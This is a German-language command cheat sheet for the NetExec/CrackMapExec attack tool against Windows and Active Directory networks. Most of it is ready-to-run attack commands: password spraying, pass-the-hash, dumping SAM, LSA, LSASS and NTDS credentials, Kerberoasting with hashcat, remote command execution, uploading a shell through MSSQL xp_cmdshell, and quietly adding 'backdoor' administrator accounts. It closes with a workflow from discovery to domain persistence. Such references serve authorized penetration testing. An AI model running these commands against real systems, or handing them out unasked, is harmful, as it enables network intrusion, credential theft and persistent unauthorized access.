Grundlagen & Authentifizierung
SMB-Verbindung testen (anonym)
nxc smb TARGET
Authentifizierung mit Passwort
nxc smb TARGET -u USER -p PASS
Pass-the-Hash (NTLM)
nxc smb TARGET -u USER -H NTLM_HASH nxc smb TARGET -u USER -H :NTLM_HASH # LM:NT Format
Lokale Authentifizierung (kein Domain)
nxc smb TARGET -u USER -p PASS --local-auth
Credential Spraying
nxc smb TARGET -u users.txt -p passwords.txt nxc smb TARGET -u users.txt -p 'Password123!'
Bei Erfolg weitermachen (kein Stop)
nxc smb TARGET -u users.txt -p pass.txt \ --continue-on-success
NULL-Session (anonym)
nxc smb TARGET -u '' -p ''
Altes CrackMapExec (gleiche Syntax)
crackmapexec smb TARGET -u USER -p PASS cme smb TARGET -u USER -p PASS
Hinweis: nxc ist der neue Befehl (NetExec). cme / crackmapexec sind Legacy — gleiche Syntax, aber nicht mehr aktiv entwickelt.

SMB — Enumeration
Netzwerk-Discovery (CIDR)
nxc smb 192.168.1.0/24
SMB-Shares auflisten
nxc smb TARGET --shares nxc smb TARGET -u USER -p PASS --shares
Aktive Sessions & eingeloggte User
nxc smb TARGET -u USER -p PASS --sessions nxc smb TARGET -u USER -p PASS --loggedon-users
Lokale User & Gruppen
nxc smb TARGET -u USER -p PASS --users nxc smb TARGET -u USER -p PASS --groups
Passwort-Policy auslesen
nxc smb TARGET -u USER -p PASS --pass-pol
Disks & RID-Bruteforce
nxc smb TARGET -u USER -p PASS --disks nxc smb TARGET -u USER -p PASS --rid-brute
Tipp: Outputs mit Pwn3d! markieren Hosts, auf denen der User lokaler Admin ist. Das ist der primäre Indikator für Lateral Movement.

Befehlsausführung
CMD-Befehl ausführen
nxc smb TARGET -u USER -p PASS -x "whoami"
PowerShell-Befehl ausführen
nxc smb TARGET -u USER -p PASS -X "Get-Process"
Ausführungsmethode wählen
nxc smb TARGET -u USER -p PASS \ --exec-method smbexec -x "whoami" nxc smb TARGET -u USER -p PASS \ --exec-method wmiexec -x "whoami" nxc smb TARGET -u USER -p PASS \ --exec-method atexec -x "whoami"
Auf gesamtem Netzwerk ausführen
nxc smb 192.168.1.0/24 -u USER -p PASS \ -x "whoami"
Ohne Output (stealth)
nxc smb TARGET -u USER -p PASS \ -x "net user hacker P@ss1 /add" --no-output
Methoden: wmiexec = Standard (WMI, kein Dienst). smbexec = Dienst-basiert (lautstärker). atexec = Task Scheduler (zeitverzögert).

Credential Dumping
SAM-Datenbank dumpen (lokale Hashes)
nxc smb TARGET -u USER -p PASS --sam
LSA-Secrets dumpen
nxc smb TARGET -u USER -p PASS --lsa
NTDS.dit dumpen (nur Domain Controller)
nxc smb DC -u USER -p PASS --ntds nxc smb DC -u USER -p PASS --ntds --users
LSASS via lsassy-Modul
nxc smb TARGET -u USER -p PASS -M lsassy
Mimikatz-Modul
nxc smb TARGET -u USER -p PASS -M mimikatz
Log-Speicherort
# NetExec: ~/.nxc/logs/ # CrackMapExec (legacy): ~/.cme/logs/
Hinweis: --ntds erfordert Domänenadmin-Rechte auf dem DC. Ergebnisse werden automatisch in den Logs gespeichert.

LDAP — Active Directory
AD-User & Gruppen enumerieren
nxc ldap DC -u USER -p PASS --users nxc ldap DC -u USER -p PASS --groups nxc ldap DC -u USER -p PASS --computers
Nur aktive User / AdminCount=1
nxc ldap DC -u USER -p PASS --active-users nxc ldap DC -u USER -p PASS --admin-count
Kerberoasting
nxc ldap DC -u USER -p PASS \ --kerberoasting kerberoast.txt
AS-REP Roasting
nxc ldap DC -u USER -p PASS \ --asreproast asrep.txt
BloodHound-Daten sammeln
nxc ldap DC -u USER -p PASS \ --bloodhound -c all
Kerberoasting: TGS-Tickets für Service-Accounts knacken. AS-REP Roasting: User ohne Kerberos-Preauthentication angreifen. Cracken mit hashcat.

WinRM
WinRM-Verbindung testen
nxc winrm TARGET -u USER -p PASS
CMD-Befehl via WinRM
nxc winrm TARGET -u USER -p PASS -x "whoami"
PowerShell via WinRM
nxc winrm TARGET -u USER -p PASS \ -X "Get-Process | Select-Object Name"
Pass-the-Hash via WinRM
nxc winrm TARGET -u Administrator -H NTLM_HASH
Interaktive Shell (evil-winrm)
evil-winrm -i TARGET -u USER -p PASS evil-winrm -i TARGET -u USER -H NTLM_HASH
Netzwerk-Scan auf WinRM (Port 5985)
nxc winrm 192.168.1.0/24 -u USER -p PASS
Pwn3d! bei WinRM bedeutet, dass der User Mitglied der Remote Management Users-Gruppe ist (oder lokaler Admin).

Module-System
Modul laden und ausführen
nxc smb TARGET -u USER -p PASS -M MODULE_NAME
Alle verfügbaren Module auflisten
nxc smb -L nxc ldap -L # für LDAP-Module
Wichtige Exploit-/Prüfmodule
-M zerologon # CVE-2020-1472 prüfen -M petitpotam # PetitPotam-Prüfung -M nopac # CVE-2021-42278/42287
Nützliche Recon-Module
-M spider_plus # SMB-Shares crawlen -M slinky # SCF-Datei → NTLM-Capture -M rdp # RDP-Status prüfen -M enum_av # AV-Lösung erkennen
Modul-Optionen anzeigen und setzen
nxc smb -M lsassy --options nxc smb TARGET -u USER -p PASS \ -M lsassy -o METHOD=DUMP_REFL_DLL
spider_plus erstellt einen JSON-Index aller lesbaren Dateien in allen Shares — ideal zur Suche nach Passwörtern in Konfigurationsdateien.

Pivoting & Lateral Movement
Pass-the-Hash SMB (Netzwerk)
nxc smb 192.168.1.0/24 \ -u Administrator -H :NTLM_HASH --local-auth
Pass-the-Hash WinRM
nxc winrm TARGET -u Administrator -H NTLM_HASH
Kerberos-Ticket nutzen (Pass-the-Ticket)
export KRB5CCNAME=/tmp/ticket.ccache nxc smb TARGET -u USER -k --use-kcache
RDP aktivieren
nxc smb TARGET -u USER -p PASS -M rdp -o ACTION=enable
Lokalen Admin-Account anlegen
nxc smb TARGET -u USER -p PASS \ -x "net user backdoor P@ss1! /add" nxc smb TARGET -u USER -p PASS \ -x "net localgroup administrators backdoor /add"
--local-auth bei PTH über ein Netzwerk-Subnet ist entscheidend: damit wird der Hash lokal gegen jeden Host geprüft, ohne Domain-Controller-Kontakt.
🗄
MSSQL
MSSQL-Verbindung testen
nxc mssql TARGET -u USER -p PASS
SQL Server lokale Authentifizierung
nxc mssql TARGET -u USER -p PASS --local-auth
SQL-Query ausführen
nxc mssql TARGET -u USER -p PASS \ -q "SELECT @@version" nxc mssql TARGET -u USER -p PASS \ -q "SELECT name FROM master.dbo.sysdatabases"
xp_cmdshell ausführen
nxc mssql TARGET -u USER -p PASS \ --xp-cmd "whoami"
Datei hochladen
nxc mssql TARGET -u USER -p PASS \ --put-file /tmp/shell.ps1 'C:\Windows\Temp\shell.ps1'
Privilege Escalation via mssql_priv
nxc mssql TARGET -u USER -p PASS -M mssql_priv
xp_cmdshell ist standardmäßig deaktiviert. Das Modul mssql_priv versucht automatisch, TRUSTWORTHY und xp_cmdshell zu aktivieren, wenn der Account dafür berechtigt ist.

Quick Reference
Netzwerk-Discovery & Enumeration
nxc smb 192.168.1.0/24 # Discovery nxc smb 192.168.1.0/24 --gen-relay-list relay.txt
Credential Spraying (sicher, kein Lockout)
nxc smb 192.168.1.0/24 \ -u users.txt -p 'Password123!' \ --continue-on-success
Pass-the-Hash nach SAM-Dump
nxc smb 192.168.1.0/24 \ -u Administrator -H :NTLM_HASH --local-auth
SAM + LSA auf allen Pwn3d!-Hosts
nxc smb targets.txt -u USER -p PASS --sam nxc smb targets.txt -u USER -p PASS --lsa
Kerberoasting + Cracken
nxc ldap DC -u USER -p PASS \ --kerberoasting tgs.txt hashcat -m 13100 tgs.txt rockyou.txt
AS-REP Roasting + Cracken
nxc ldap DC -u USER -p PASS \ --asreproast asrep.txt hashcat -m 18200 asrep.txt rockyou.txt
BloodHound + NTDS (DC kompromittiert)
nxc ldap DC -u USER -p PASS --bloodhound -c all nxc smb DC -u USER -p PASS --ntds
Typischer Workflow: Discovery → Spraying → Pwn3d! → SAM/LSA-Dump → PTH auf Netzwerk → DC-Zugriff → NTDS-Dump → Domain-Persistence.
